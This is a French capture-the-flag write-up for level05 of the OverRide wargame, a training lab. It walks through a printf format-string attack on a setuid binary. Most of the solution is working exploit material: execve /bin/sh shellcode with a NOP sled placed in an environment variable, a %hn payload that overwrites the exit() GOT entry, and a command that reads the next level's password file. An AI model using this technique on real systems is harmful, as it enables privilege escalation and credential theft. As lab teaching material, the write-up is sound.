## Comportement
- J'ai des droits `level04` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 level06 users   5176 Sep 10  2016 level05*`
En exécutant le binaire (`./level05`), on observe:
- qu'il attend un input de notre part.
- il print ce qu'on lui envoie, meme s'il n'y a rien.
- qu'il ne segfault pas meme si l'input est tres long.
    ```shell
    level05@OverRide:~$ ./level05 
    kk
    kk
    level05@OverRide:~$ ./level05 


    level05@OverRide:~$ ./level05 
    jbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
    jbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbjjjjjjjjjjjlevel05@OverRide:~$ 
    ```


## Analyse
En analysant le binaire (`gdb ./level05`) on observe:
- Presence d'un printf vulnerable. On peut donc tenter un Format String Attack.
- Pas d'ouverture de shell dans le code, on va donc importer un shellcode. 
- On peut reecrire l'adresse de `exit()` avec l'adresse de notre shellcode.


## Résolution
- D'abord on trouve l'offset de notre string. Il est de 10. En effet c'est a partir de la 10 eme adresse que l'on commence a ecrire :
    ```shell
    level05@OverRide:~$ python -c 'print "BBBB"+"-%x"*12' | ./level05 
    bbbb-64-f7fcfac0-f7ec3af9-ffffd5ef-ffffd5ee-0-ffffffff-ffffd674-f7fdb000-62626262-2d78252d-252d7825
    ```
- Pour l'exploiter, nous pouvons stocker un shellcode dans une variable d'environnement et l'injecter à la 10ème position. Voici le shellcode qu'on utilisera : 
    ```shell
    \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
    ```
- On cree une variable d'environnement pour stocker notre shellcode, precede d'une bande de NOP isntructions : 
    ```shell
    $ env -i PAYLOAD=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
    ```
- On determine une adresse dans cette bande de NOP instructions (`0xffffdc59` par exemple) : 
    ```shell
    (gdb) x/200s environ
    0xffffdb75:	 "/home/users/level05/level05"
    0xffffdb91:	 "PAYLOAD=\220\220\220"...
    0xffffdc59:	 "\220\220\220\220\220"...
    0xffffdd21:	 "\220\220\220\220\220"...
    0xffffdde9:	 "\220\220\220\220\220"...
    0xffffdeb1:	 "\220\220\220\220\220"...
    0xffffdf79:	 "\220\220\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f\315\200\061\333\211\330@\315\200\350\334\377\377\377/bin/sh"
    0xffffdfaf:	 "COLUMNS=104"
    ```
- On cherche l'adresse de `exit()` pour l'overwrite avec celle de notre shellcode (`0x80497e0`) : 
    ```shell
    (gdb) info function exit
    All functions matching regular expression "exit":

    Non-debugging symbols:
    0x08048370  exit
    0x08048370  exit@plt

    (gdb) x/i 0x08048370
    0x8048370 <exit@plt>:	jmp    *0x80497e0
    ```
- Nous devons écrire dans l'adresse d'`exit()` en 2 fois, car `0xffffdc59` en décimal correspond a 4294958169, trop long a cause du padding de printf. On le divise donc en deux : `dc59 (56409 - 8 pour nos 2 adresses écrites précédemment) + ffff (65535 - tous les caractères précédents (56409))`
- On craft notre payload : `python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56401d"+"%10$hn"+"%9126d"+"%11$hn"'`
- On appele le binaire avec sans oublier la variable d'environnement : 
    ```shell
    $ (python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56401d"+"%10$hn"+"%9126d"+"%11$hn"';cat) | env -i PAYLOAD=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level05
    ```
- Un shell s'ouvre avec de nouveaux privilèges : en effet, si l'on tape `whoami`, on obtient `level06`.
- Il ne reste plus qu'à :
  - récupérer le password (`cat /home/users/level06/.pass`)
  - quitter le shell (`exit`)
  - et passer au level06 (`su level06`) en renseignant ce password.
  